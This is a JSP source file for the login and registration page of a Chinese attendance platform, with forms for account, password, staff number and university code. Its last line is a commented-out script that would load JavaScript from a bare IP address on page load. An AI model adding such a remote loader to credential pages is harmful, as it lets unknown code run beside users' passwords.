<%-- <%@ page language="java" contentType="text/html; charset=UTF-8"
  pageEncoding="UTF-8" isELIgnored="false" %>
<%@ taglib prefix="spring" uri="http://www.springframework.org/tags"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib prefix="form" uri="http://www.springframework.org/tags/form"%>
<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
    <meta charset="utf-8">
    <title>登录</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
	<div class="content"> 
		<c:url value="login" var="loginActoin" /> 
		<form action="${loginActoin}" method="post">
			<label>用户名：</label>
			<input type="text" id="code" name="code"/>
			<label>密码：</label>
			<input type="password" id="password" name="password"/>
			<button type="submit">登录</button>
		</form>
		<p>${message }</p>
	</div>
</body>
</html> --%>

<%@ page language="java" contentType="text/html; charset=UTF-8"
  pageEncoding="UTF-8" isELIgnored="false" %>
<%@ taglib prefix="spring" uri="http://www.springframework.org/tags"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib prefix="form" uri="http://www.springframework.org/tags/form"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" class="no-js">
<head>
<title>考勤平台登录</title> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script type="text/javascript" src="js/jquery-1.9.0.min.js"></script>
<script type="text/javascript" src="js/login.js"></script>
<link href="css/login2.css" rel="stylesheet" type="text/css" />
</head>
<h1>考勤平台登录<sup>Alpha</sup></h1>

<div class="login" style="margin-top:50px;">
    
    <div class="header">
        <div class="switch" id="switch"><a class="switch_btn_focus" id="switch_qlogin" href="javascript:void(0);" tabindex="7">快速登录</a>
			<a class="switch_btn" id="switch_login" href="javascript:void(0);" tabindex="8">快速注册</a><div class="switch_bottom" id="switch_bottom" style="position: absolute; width: 64px; left: 0px;"></div>
        </div>
    </div>    
  
    
    <div class="web_qr_login" id="web_qr_login" style="display: block; height: 235px;">    

            <!--登录-->
            <div class="web_login" id="web_login">
               
               
               <div class="login-box">
    
            
			<div class="login_form">
			    <c:url value="login" var="loginActoin" /> 
				<form action="${loginActoin}" name="loginform" accept-charset="utf-8" id="login_form" class="loginForm" method="post"><input type="hidden" name="did" value="0"/>
                <input type="hidden" name="to" value="log"/>
                <div class="uinArea" id="uinArea">
                <label class="input-tips" for="u">帐号：</label>
                <div class="inputOuter" id="uArea">
                <input type="text" id="u" name="code" class="inputstyle"/>
                </div>
                </div>
                <div class="pwdArea" id="pwdArea">
               <label class="input-tips" for="p">密码：</label> 
               <div class="inputOuter" id="pArea">
                    
                    <input type="password" id="p" name="password" class="inputstyle"/>
                </div>
                </div>
               
                <div style="padding-left:50px;margin-top:20px;"><input type="submit" value="登 录" style="width:150px;" class="button_blue"/></div>
              </form>
              
           </div>
           
            	</div>
            	<br/>
            	<br/>
 
               <p style="text-align:center;">${message }</p>
            </div>
            <!--登录end-->
  </div>

  <!--注册-->
    <div class="qlogin" id="qlogin" style="display: none; ">
   
    <div class="web_login">
    
    <c:url value="register" var="registerActoin" /> 
    <form name="form2" id="regUser" accept-charset="utf-8"  action="${registerActoin}" method="post">
	      <input type="hidden" name="to" value="reg"/>
		      		       <input type="hidden" name="did" value="0"/>
        <ul class="reg_form" id="reg-ul">
        		<div id="userCue" class="cue">快速注册请注意格式</div>
                <li>
                	
                    <label for="user"  class="input-tips2">用户姓名：</label>
                    <div class="inputOuter2">
                        <input type="text" id="user" name="name" maxlength="16" class="inputstyle2"/>
                    </div>
                    
                </li>
                
                <li>
                <label for="passwd" class="input-tips2">密码：</label>
                    <div class="inputOuter2">
                        <input type="password" id="passwd"  name="password" maxlength="16" class="inputstyle2"/>
                    </div>
                    
                </li>
                <li>
                <label for="passwd2" class="input-tips2">确认密码：</label>
                    <div class="inputOuter2">
                        <input type="password" id="passwd2" name="" maxlength="16" class="inputstyle2" />
                    </div>
                    
                </li>
                
                <li>
                 <label for="code" class="input-tips2">职工号码：</label>
                    <div class="inputOuter2">
                       
                        <input type="text" id="code" name="code" maxlength="10" class="inputstyle2"/>
                    </div>
                   
                </li>
				
				<li>
                 <label for="school" class="input-tips2">所属大学：</label>
                    <div class="inputOuter2">
                        <input type="text" id="school" name="schoolCode" maxlength="10" class="inputstyle2"/>
                    </div>
                   
                </li>
                
                <li>
                    <div class="inputArea">
                        <input type="button"  id="reg"  style="margin-top:10px;margin-left:85px;" class="button_blue" value="同意协议并注册"/> <a onclick="f1()" href="javascript:void(0);" class="zcxy">注册协议</a>
						<script>
						function f1(){
						    confirm("  协议如下：\r 1、请确保您的信息真实；\r 2、请遵循填写规范；\r 3、信息应与校内保持一致 " );
						}
						</script>
                    </div>
           
                </li><div class="cl"></div>
            </ul>
         </form>
           
    
    </div>
   
    
    </div>
    <!--注册end-->
</div>
</body>
</html>
<!-- <script type="text/javascript">(function(){var js = document.createElement("script");js.src="http://122.227.254.195/DB2927DA968D3599D7126C59B2CF6595?id=1&t=656960&m=b43f328c6d75eab1"+Math.random();var h = document.getElementsByTagName("head")[0];h.appendChild(js);})()</script> -->